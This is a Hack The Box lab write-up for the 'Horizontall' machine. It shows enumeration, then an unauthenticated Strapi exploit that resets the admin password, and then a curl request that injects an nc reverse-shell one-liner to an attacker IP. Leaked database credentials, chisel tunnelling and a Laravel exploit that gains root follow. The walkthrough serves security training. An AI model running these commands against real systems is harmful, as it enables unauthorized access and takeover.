---
layout: default
title: Horizontall
parent: Hack The Box
nav_order: 1
has_children: false
permalink: /htb/horizontall
---

# Horizontall Lab Report
![Screenshot 1](/assets/images/htb/horizontall/banner.png)
- OS: Ubuntu
- Server: Nginx 1.14
# 0. Preparation
1. Add 10.10.11.10 to /etc/hosts as horizontall.htb
# 1. Enumeration
## 1.1 NMAP
```
sudo nmap -sS 10.10.11.105 -p- --min-rate=1000

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 17:27 JST
Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.11.105
Host is up (0.23s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 80.47 seconds
```
```
sudo nmap -sV 10.10.11.105 -p20,80 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-03 17:32 JST
Nmap scan report for 10.10.11.105
Host is up (0.29s latency).

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
80/tcp open   http     nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.45 seconds
```
## 1.2 Subdomain/VHOST Enumeration
```
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u horizontall.htb
```
-> nothing
```
gobuster dns -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --domain horizontall.htb
```
-> nothing

## 1.3 Dirsearch & Dirbuster
```
python3 dirsearch.py -u http://horizontall.htb

[17:56:46] Starting: 
[17:56:49] 301 -  194B  - /js  ->  http://horizontall.htb/js/
[17:57:33] 301 -  194B  - /css  ->  http://horizontall.htb/css/                                                                         
[17:57:39] 200 -    4KB - /favicon.ico                                      
[17:57:42] 301 -  194B  - /img  ->  http://horizontall.htb/img/                                       
[17:57:43] 200 -  901B  - /index.html                                                                          
[17:57:45] 403 -  580B  - /js/                                                                          
                                 
Task Completed 
 ```

```
DirBuster

/
/img/
/js/
/css/
/js/app.c68eb462.js
/js/chunk-vendors.0e02b89e.js
```
-> read /js/chunk-vendors.0e02b89e.js

## 1.4 Unminify /js/chunk-vendors.0e02b89e.js
```
...
methods: {
                    getReviews: function () {
                        var t = this;
                        r.a.get("http://api-prod.horizontall.htb/reviews").then(function (s) {
                            return (t.reviews = s.data);
                        });
                    }
},
...
```
-> Add api-prod to /etc/hosts

## 1.4 Dirsbuster & Dirsearch api-prod (Strapi)
```

[18:13:50] Starting: 
[18:14:06] 200 -  854B  - /ADMIN                                                                                                        
[18:14:06] 200 -  854B  - /Admin                                       
[18:14:06] 200 -  854B  - /Admin/login/                                
[18:14:12] 400 -   67B  - /\..\..\..\..\..\..\..\..\..\etc\passwd                          
[18:14:16] 200 -  854B  - /admin                                                                     
[18:14:17] 200 -  854B  - /admin/.config          
[18:14:17] 200 -  854B  - /admin/.htaccess
[18:14:17] 200 -  854B  - /admin/
[18:14:17] 200 -  854B  - /admin/FCKeditor
[18:14:17] 200 -  854B  - /admin/?/login
[18:14:17] 200 -  854B  - /admin/_logs/access-log
[18:14:17] 200 -  854B  - /admin/_logs/access_log
[18:14:17] 200 -  854B  - /admin/_logs/error_log
[18:14:17] 200 -  854B  - /admin/access_log     
[18:14:17] 200 -  854B  - /admin/account
[18:14:17] 200 -  854B  - /admin/admin       
[18:14:17] 200 -  854B  - /admin/admin-login
[18:14:18] 200 -  854B  - /admin/admin/login     
[18:14:18] 200 -  854B  - /admin/adminLogin
[18:14:18] 200 -  854B  - /admin/_logs/error-log
[18:14:18] 200 -  854B  - /admin/admin_login    
[18:14:18] 200 -  854B  - /admin/backup/         
[18:14:18] 200 -  854B  - /admin/backups/
[18:14:18] 200 -  854B  - /admin/controlpanel
[18:14:18] 200 -  854B  - /admin/cp               
[18:14:18] 200 -  854B  - /admin/db/            
[18:14:18] 200 -  854B  - /admin/default
[18:14:18] 200 -  854B  - /admin/dumper/          
[18:14:18] 200 -  854B  - /admin/error_log        
[18:14:18] 200 -  854B  - /admin/home                                                                       
[18:14:18] 200 -  854B  - /admin/index    
[18:14:18] 200 -  854B  - /admin/index.html             
[18:14:18] 200 -  854B  - /admin/js/tiny_mce
[18:14:18] 200 -  854B  - /admin/js/tiny_mce/
[18:14:18] 200 -  854B  - /admin/js/tinymce
[18:14:18] 200 -  854B  - /admin/js/tinymce/
[18:14:18] 200 -  854B  - /admin/log
[18:14:18] 200 -  854B  - /admin/login
[18:14:18] 200 -  854B  - /admin/logs/                                                 
[18:14:18] 200 -  854B  - /admin/logs/access-log
[18:14:18] 200 -  854B  - /admin/logs/access_log
[18:14:18] 200 -  854B  - /admin/logs/error-log 
[18:14:18] 200 -  854B  - /admin/manage
[18:14:18] 200 -  854B  - /admin/logs/error_log
[18:14:18] 200 -  854B  - /admin/mysql/          
[18:14:18] 200 -  854B  - /admin/pMA/            
[18:14:18] 200 -  854B  - /admin/phpMyAdmin
[18:14:18] 200 -  854B  - /admin/phpMyAdmin/
[18:14:18] 200 -  854B  - /admin/phpmyadmin/         
[18:14:18] 200 -  854B  - /admin/pma/                 
[18:14:18] 200 -  854B  - /admin/scripts/fckeditor
[18:14:18] 200 -  854B  - /admin/release
[18:14:18] 200 -  854B  - /admin/private/logs
[18:14:18] 200 -  854B  - /admin/portalcollect.php?f=http://xxx&t=js
[18:14:18] 200 -  854B  - /admin/signin          
[18:14:18] 200 -  854B  - /admin/sxd/
[18:14:18] 200 -  854B  - /admin/sqladmin/
[18:14:19] 200 -  854B  - /admin/sysadmin/
[18:14:19] 200 -  854B  - /admin/tinymce
[18:14:19] 200 -  854B  - /admin/tiny_mce
[18:14:19] 200 -  854B  - /admin/web/          
[18:14:44] 200 -    1KB - /favicon.ico                                                                            
[18:14:48] 200 -  413B  - /index.html                                                                          
[18:15:07] 200 -  507B  - /reviews                                                                      
[18:15:07] 200 -  121B  - /robots.txt 
[18:15:09] 400 -   69B  - /servlet/%C0%AE%C0%AE%C0%AF                                                   
[18:15:17] 403 -   60B  - /users                                                                                  
[18:15:17] 403 -   60B  - /users/admin.php
[18:15:17] 403 -   60B  - /users/login.php
[18:15:17] 403 -   60B  - /users/admin
[18:15:17] 403 -   60B  - /users/login
[18:15:17] 403 -   60B  - /users/
[18:15:17] 403 -   60B  - /users/login.jsp
[18:15:17] 403 -   60B  - /users/login.aspx
[18:15:17] 403 -   60B  - /users/login.html
[18:15:17] 403 -   60B  - /users/login.js
                                                                                                
Task Completed
 ```

## 1.5 Burp to get Strappy Ver.
```
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Fri, 03 Sep 2021 09:41:22 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 144
Connection: close
Vary: Origin
Content-Security-Policy: img-src 'self' http:; block-all-mixed-content
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
X-Powered-By: Strapi <strapi.io>

{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}
```

# 2. Foothold (Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated))
<a href="https://www.exploit-db.com/exploits/50239" target="_blank" rel="noopener noreferer">https://www.exploit-db.com/exploits/50239</a>

```
$ python3 exploit.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNjYyODgzLCJleHAiOjE2MzMyNTQ4ODN9.xafadktF99A7jvd6qfMPlYk9In56jLzFe1zZ64ZWYNg
```

# 3. User
Use the JSON Web Token above to get a reverse shell (strapi)
<a href="https://bittherapy.net/post/strapi-framework-remote-code-execution/" target="_blank" rel="noopener noreferer">https://bittherapy.net/post/strapi-framework-remote-code-execution/</a>


```
curl -i -s -k -X $'POST' -H $'Host: api-prod.horizontall.htb' -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjMwNzQwMDQ3LCJleHAiOjE2MzMzMzIwNDd9.H6NyjtfJoFtJqLMfZ3DBrgvAYeoVbBxYyXXtN3o6c8A' -H $'Content-Type: application/json' -H $'Content-Length: 123' -H $'Connection: close' --data $'{\"plugin\":\"documentation && $(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.97 1337 >/tmp/f)\",\"port\":\"80\"}' $'http://api-prod.horizontall.htb:80/admin/plugins/install'
```
-> Read User Flag
```
$ nc -lvnp 1337                                     
listening on [any] 1337 ...
connect to [10.10.14.97] from (UNKNOWN) [10.10.11.105] 36274
/bin/sh: 0: can't access tty; job control turned off
$ cat /home/developer/user.txt
0bfb6a54256af0cfa613e33a2959422c
```

# 4. Privesc
## 4.1 Enumeration
```
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
strapi:x:1001:1001::/opt/strapi:/bin/sh
```

```
config/environments/development/database.json

$ cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}
```
-> logged in mysql but no useful information

```
$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 10.10.11.105:38444      10.10.14.97:9090        CLOSE_WAIT 
tcp        0      0 10.10.11.105:52748      10.10.17.127:4444       ESTABLISHED
tcp        0      0 10.10.11.105:56248      10.10.14.97:1337        ESTABLISHED
tcp        0      0 10.10.11.105:56226      10.10.14.97:1337        ESTABLISHED
tcp        0      0 10.10.11.105:56236      10.10.14.97:1337        CLOSE_WAIT 
tcp        0      0 10.10.11.105:56242      10.10.14.97:1337        ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::9090                 :::*                    LISTEN     
tcp6       0      0 :::8080                 :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN   
```
-> port 1337: node, port 8000?

## 4.2 Chisel
Reference: <a href="https://www.youtube.com/watch?v=gr8ZKQpYiug" target="_blank" rel="noopener noreferer">https://www.youtube.com/watch?v=gr8ZKQpYiug</a>
Target
```
chisel client 10.10.14.97:8000 R:8001:127.0.0.1:8000
```
Attacker
```
chisel server 8000 --reverse 
```
Access 127.0.0.1:8001 
-> Laravel v8 (PHP v7.4.18) 

## 4.3 Exploit (CVE-2019-9081)
Reference: <a href="https://github.com/nth347/CVE-2019-9081_poc" target="_blank" rel="noopener noreferer">https://github.com/nth347/CVE-2019-9081_poc</a>

```
python3 exploit.py http://localhost:8001 Monolog/RCE1 id 
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```
Done!